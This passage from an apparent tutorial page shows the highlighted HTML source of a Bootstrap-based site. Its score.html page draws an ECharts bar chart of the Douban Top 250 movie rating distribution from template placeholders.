class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. --></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="score-html"><a href="#score-html" class="headerlink" title="score.html"></a>score.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/echarts.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span><span class="token comment">&lt;!-- ======= Our Team Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>豆瓣电影Top250评分分布<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token comment">&lt;!-- ======= Counts Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counts section-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- 为 ECharts 准备一个具备大小（宽高）的 DOM --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span>300px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Counts Section --></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Our Team Section --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> dom <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> myChart <span class="token operator">=</span> echarts<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>dom<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>option <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>option <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    color<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'#3398DB'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    tooltip<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        trigger<span class="token operator">:</span> <span class="token string">'axis'</span><span class="token punctuation">,</span>        axisPointer<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            type<span class="token operator">:</span> <span class="token string">'shadow'</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    grid<span class="token operator">:</span><span class="token punctuation">&#123;</span>        left<span class="token operator">:</span><span class="token string">'3%'</span><span class="token punctuation">,</span>        right<span class="token operator">:</span><span class="token string">'4%'</span><span class="token punctuation">,</span>        bottom<span class="token operator">:</span><span class="token string">'3%'</span><span class="token punctuation">,</span>        containLabel<span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    xAxis<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">'category'</span><span class="token punctuation">,</span>        data<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> score <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    yAxis<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">'value'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    series<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        data<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> num <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        type<span class="token operator">:</span> <span class="token string">'bar'</span><span class="token punctuation">,</span>        barWidth<span class="token operator">:</span><span class="token string">'60%'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>option <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> option <span class="token operator">===</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    myChart<span class="token punctuation">.</span><span class="token function">setOption</span><span class="token punctuation">(</span>option<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span 